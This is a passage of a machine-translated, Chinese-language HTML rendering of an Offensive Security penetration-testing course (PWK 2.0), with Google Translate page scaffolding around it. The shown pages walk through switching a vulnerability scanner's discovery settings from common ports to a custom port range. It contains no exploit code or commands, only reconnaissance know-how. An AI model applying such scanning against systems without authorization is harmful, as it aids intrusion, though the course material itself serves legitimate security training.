<div style="position:absolute;top:258950;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络扫描</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只会扫描公共端口。</font><font style="vertical-align: inherit;">为了改变这一点，我们点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发现</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链接</font></font></nobr></div>
<div style="position:absolute;top:258969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡的</font><font style="vertical-align: inherit;">左侧</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:259159;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="219"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 219 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:259192;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:260269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:260269;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:260269;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">219</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:259735;left:334"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 56：访问发现设置</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:259766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Scan Type</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下拉列表中，我们将值从</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Port scan (common ports)</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Custom</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:260347;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="220"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 220 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:260380;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:261457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:261457;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:261457;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:261062;left:265"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 57：配置扫描器以使用自定义端口配置</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:261093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Discovery</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下添加其他配置</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">接下来，我们将单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发现</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口</font></font></i></nobr></div>
<div style="position:absolute;top:261113;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置端口范围：</font></font></nobr></div>
</span></font>


<script>_addload(function(){_setupIW('com');_csi('en','zh-CN','o3cp%5B001-220%5D.pdf');});</script>
            <script>
              function gtElInit() {
                var lib = new google.translate.TranslateService();
                lib.setCheckVisibility(false);
                lib.translatePage('en', 'zh-CN', function (progress, done, error) {
                  if (progress == 100 || done || error) {
                    document.getElementById("gt-dt-spinner").style.display = "none";
                  }
                });
              }
            </script>
            <script src="./o3cp[001-220]_files/f.txt">
            </script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./o3cp[001-220]_files/translate_24dp.png" width="20" height="20" alt="Google 翻译"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">原文</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">提供更好的翻译建议</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
          <div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><span><div class="gmnoprint" style="display: none; z-index: 2147483647;"><img src="./o3cp[001-220]_files/iws_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[001-220]_files/iws_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[001-220]_files/iws_w.png" style="position: absolute; left: 0px; top: 0px; width: 8px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[001-220]_files/iws_e.png" style="position: absolute; left: 0px; top: 0px; width: 8px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[001-220]_files/iws_s.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[001-220]_files/iws_s.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[001-220]_files/iws_c.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><div class="SPRITE_iws_nw" style="overflow: hidden;"></div><div class="SPRITE_iws_ne" style="overflow: hidden;"></div><div class="SPRITE_iws_sw" style="overflow: hidden;"></div><div class="SPRITE_iws_se" style="overflow: hidden;"></div><div class="SPRITE_iws_tap" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_l" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_u" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_ul" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_rd" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_ld" style="overflow: hidden;"></div><div class="SPRITE_iws_tab_dl" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_dr" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_l" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_r" style="overflow: hidden; display: none;"></div></div></span><div id="google-infowindow" class="notranslate"><div class="gmnoprint" style="display: none; z-index: 2147483647;"><img src="./o3cp[001-220]_files/iw_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[001-220]_files/iw_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[001-220]_files/iw_w.png" style="position: absolute; left: 0px; top: 0px; width: 6px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[001-220]_files/iw_e.png" style="position: absolute; left: 0px; top: 0px; width: 6px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[001-220]_files/iw_s0.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[001-220]_files/iw_s0.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[001-220]_files/iw_c.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><div class="SPRITE_iw_nw" style="overflow: hidden;"></div><div class="SPRITE_iw_ne" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_l" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_u" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_ul" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_rd" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_ld" style="overflow: hidden;"></div><div class="SPRITE_iw_sw0" style="overflow: hidden;"></div><div class="SPRITE_iw_se0" style="overflow: hidden;"></div><div class="SPRITE_close" style="overflow: hidden; z-index: 10000; cursor: pointer; visibility: visible;"></div><div class="SPRITE_maximize" style="overflow: hidden; z-index: 10000; visibility: hidden; cursor: pointer; display: none;"></div><div class="SPRITE_restore" style="overflow: hidden; z-index: 10001; visibility: hidden; cursor: pointer; display: none;"></div></div></div><div style="display: none;"><iframe sandbox="" id="google-feedback-frame" name="FEEDBACK_TARGET_IFRAME_NAME" src="./o3cp[001-220]_files/saved_resource.html"></iframe></div></body></html>